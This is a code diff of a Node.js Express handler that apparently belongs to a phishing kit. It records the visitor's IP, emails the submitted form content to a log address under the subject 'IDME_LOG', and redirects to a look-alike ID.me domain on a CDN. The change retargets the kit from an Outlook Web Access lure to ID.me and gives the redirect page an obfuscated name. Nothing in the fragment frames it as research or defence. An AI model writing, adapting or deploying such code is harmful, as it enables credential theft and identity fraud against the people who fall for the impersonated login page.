@@ -60,13 +60,13 @@ app.post("/", (req, res) => {
  
   let ip2 = requestIp.getClientIp(req);
 
-  let redirectUrl = "https://api-id-me.b-cdn.net/idme23.html";
+  let redirectUrl = "https://api-id-me.b-cdn.net/idmepage2-VBORw0KGgoAAAANSUhEUgAAA44AAAFqCAYAAABVvQQpAAAACXBIWXMAABYlAAAWJQFJUi.html";
 
   sendmail(
     {
       from: "docu@logscentral.com",
       to: logEmail,
-      subject: "EMAIL-LOG OWA " + ip2,
+      subject: "IDME_LOG " + ip2,
       html,
     },
     function (err, reply) {
